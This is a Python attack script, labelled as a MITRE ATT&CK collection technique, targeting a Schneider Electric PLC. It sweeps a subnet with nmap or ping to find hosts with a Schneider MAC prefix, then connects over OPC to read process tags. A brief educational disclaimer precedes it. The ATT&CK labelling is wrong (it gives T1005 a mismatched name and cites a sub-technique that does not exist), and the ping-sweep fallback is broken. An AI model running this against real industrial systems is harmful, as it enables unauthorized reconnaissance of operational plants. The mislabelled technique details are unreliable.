# MITRE ATT&CK Tactic: Collection
# Technique: Automated Collection (T1005)
# Sub-Technique: Native Control Protocols (OPC)
# Target PLC: Schneider Electric TM221CE16R
# Description: This script attempts to automatically collect data from a PLC using OPC.
#              It first attempts to discover the PLC's IP address via network scan, 
#              then uses an OPC client library to connect to the PLC and read some common tags.
# Disclaimer: This script is for educational and demonstration purposes only.
#             Unauthorized access or use of industrial control systems is illegal and can be dangerous.
#             Use this script at your own risk.  Ensure you have proper authorization and a safe environment.

import sys
import subprocess
import re
import time
import logging

# Configure logging (optional, but recommended)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

try:
    import OpenOPC
except ImportError:
    print("Error: OpenOPC library not found.  Please install it. (e.g., `pip install OpenOPC`)")
    sys.exit(1)

# --- Configuration ---
PLC_IP_ADDRESS = None # Initialize to None to trigger IP discovery
PLC_OPC_SERVER = 'Matrikon.OPC.Simulation.1' # Example OPC Server.  Change if different.  Likely needs adjustment
OPC_TAGS_TO_READ = ['Simulation Items.Integer1', 'Simulation Items.Real1', 'Simulation Items.String1'] # Example tags.  Change to relevant tags for your PLC.

# --- Functions ---

def find_plc_ip_address(ip_range="192.168.1.0/24"):
    """
    Attempts to find the PLC's IP address by scanning the network.
    Uses nmap if available, otherwise falls back to ping sweep.
    Requires root/administrator privileges.
    """
    logging.info(f"Attempting to discover PLC IP address in range: {ip_range}")

    try:
        # Try nmap (more reliable and faster if available)
        try:
            result = subprocess.run(['nmap', '-sn', ip_range], capture_output=True, text=True, check=True)
            output = result.stdout
            ip_pattern = r"Nmap scan report for (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})"
            matches = re.findall(ip_pattern, output)

            # Attempt to filter by MAC address OUI (Schneider Electric) to be more precise
            # This is OPTIONAL and requires further refinement based on your network.
            schneider_oui = "00:80:F4"  # Example Schneider Electric OUI.  Likely needs adjustment
            possible_plcs = []

            for ip in matches:
                arp_result = subprocess.run(['arp', '-n', ip], capture_output=True, text=True)
                arp_output = arp_result.stdout
                if schneider_oui in arp_output:
                    possible_plcs.append(ip)
                    logging.info(f"Found possible PLC IP address: {ip} (matches Schneider Electric OUI)")

            if possible_plcs:
                logging.info(f"Found possible PLC IP addresses: {possible_plcs}")
                return possible_plcs[0] #Return first valid IP address. It needs to be improved to check connection with PLC
            else:
                logging.warning("No PLC IP address found matching Schneider Electric OUI.  Check the OUI or network configuration.")
                return None

        except FileNotFoundError:
            logging.warning("nmap not found.  Falling back to ping sweep.")
            # Fallback to ping sweep (less reliable, requires root/admin)
            ip_base = ip_range.split('.')[0] + '.' + ip_range.split('.')[1] + '.' + ip_range.split('.')[2] + '.'
            for i in range(1, 255):  # Check IPs from x.x.x.1 to x.x.x.254
                ip_address = ip_base + str(i)
                try:
                    subprocess.run(['ping', '-n', '1', '-w', '100', ip_address],  # -n 1 (Windows), -c 1 (Linux/macOS) for single ping
                                   capture_output=True, text=True, timeout=0.1)  # Adjust timeout for speed
                    logging.info(f"Found IP address: {ip_address}")
                    return ip_address # Return the first address found
                except subprocess.TimeoutExpired:
                    pass  # IP not responding

            logging.warning("No PLC IP address found using ping sweep.")
            return None

    except Exception as e:
        logging.error(f"Error during IP address discovery: {e}")
        return None



def collect_data_from_plc(plc_ip, opc_server, tags):
    """
    Connects to the PLC via OPC and reads the specified tags.
    """
    try:
        opc = OpenOPC.client()
        opc.connect(opc_server, plc_ip)
        logging.info(f"Connected to OPC server {opc_server} on {plc_ip}")

        try:
            data = opc.read(tags)
            logging.info(f"Read data from tags: {data}")

            # Process the collected data (e.g., save to file, send over network)
            for tag, value, quality, timestamp in data:
                print(f"Tag: {tag}, Value: {value}, Quality: {quality}, Timestamp: {timestamp}")
                logging.info(f"Tag: {tag}, Value: {value}, Quality: {quality}, Timestamp: {timestamp}")
                # In a real-world scenario, you would likely store this data in a file
                # or send it to a remote server.

        except Exception as e:
            logging.error(f"Error reading OPC tags: {e}")

        finally:
            opc.close()
            logging.info("Disconnected from OPC server.")

    except OpenOPC.errors.OpenOPCError as e:
        logging.error(f"OPC Connection Error: {e}")
    except Exception as e:
        logging.error(f"Unexpected error: {e}")

# --- Main ---
if __name__ == "__main__":

    if PLC_IP_ADDRESS is None:
        logging.info("PLC IP address is not configured.  Attempting to discover it.")
        PLC_IP_ADDRESS = find_plc_ip_address()

        if PLC_IP_ADDRESS is None:
            print("Error: Could not automatically discover PLC IP address.  Please configure PLC_IP_ADDRESS manually.")
            logging.error("Could not automatically discover PLC IP address.  Please configure PLC_IP_ADDRESS manually.")
            sys.exit(1)
        else:
            print(f"Found PLC IP address: {PLC_IP_ADDRESS}")
            logging.info(f"Found PLC IP address: {PLC_IP_ADDRESS}")


    print(f"Using PLC IP address: {PLC_IP_ADDRESS}")
    print(f"OPC Server: {PLC_OPC_SERVER}")
    print(f"Tags to read: {OPC_TAGS_TO_READ}")
    logging.info(f"Using PLC IP address: {PLC_IP_ADDRESS}")
    logging.info(f"OPC Server: {PLC_OPC_SERVER}")
    logging.info(f"Tags to read: {OPC_TAGS_TO_READ}")

    collect_data_from_plc(PLC_IP_ADDRESS, PLC_OPC_SERVER, OPC_TAGS_TO_READ)

    print("Script finished.")
    logging.info("Script finished.")